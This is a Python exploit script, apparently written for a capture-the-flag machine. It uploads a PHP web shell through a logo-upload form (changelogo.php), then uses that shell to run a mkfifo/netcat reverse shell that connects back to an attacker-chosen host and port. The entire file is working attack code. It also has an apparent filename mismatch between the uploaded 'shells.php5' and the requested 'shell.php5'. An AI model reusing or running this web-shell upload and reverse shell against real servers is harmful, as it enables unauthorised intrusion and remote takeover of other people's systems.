import requests
import re
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def upload_file(ip):
    #uploading the file
    upload_url = 'http://' + ip + '/sparklays/design/changelogo.php'
    headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryHsPh3IrJF9mq73Hj"}
    data = """------WebKitFormBoundaryHsPh3IrJF9mq73Hj
Content-Disposition: form-data; name="file"; filename="shells.php5"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>

------WebKitFormBoundaryHsPh3IrJF9mq73Hj
Content-Disposition: form-data; name="submit"

upload file
------WebKitFormBoundaryHsPh3IrJF9mq73Hj--
    """
    r = requests.post(upload_url, headers=headers, data=data, proxies=proxies, verify=False)
    res = r.text
    if "The file was uploaded successfully" in res:
        print("[+] The file was uploaded successfully! ")
    else:
        print("[-] The file was not uploaded... ")
        sys.exit()
        
def poppin_shell(ip, LHOST, LPORT):
    command = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f' % (LHOST, LPORT)
    command_url = 'http://' + ip + '/sparklays/design/uploads/shell.php5?cmd='
    escaped_command = urllib.parse.quote(command)
    full_exploit = command_url + escaped_command

    r = requests.get(full_exploit, proxies=proxies, verify=False)
    res = r.text
    if r.status_code == 200:
        print("[+] Output of the command: ")
        print(res)


def main():
    if len(sys.argv) != 4:
        print("(+) usage: %s <target> <LHOST> <LPORT>" % sys.argv[0])
        print('(+) eg: %s example.com 10.10.14.23 8000' % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    
    upload_file(ip)
    poppin_shell(ip, LHOST, LPORT)
    
    
if __name__ == "__main__":
    main()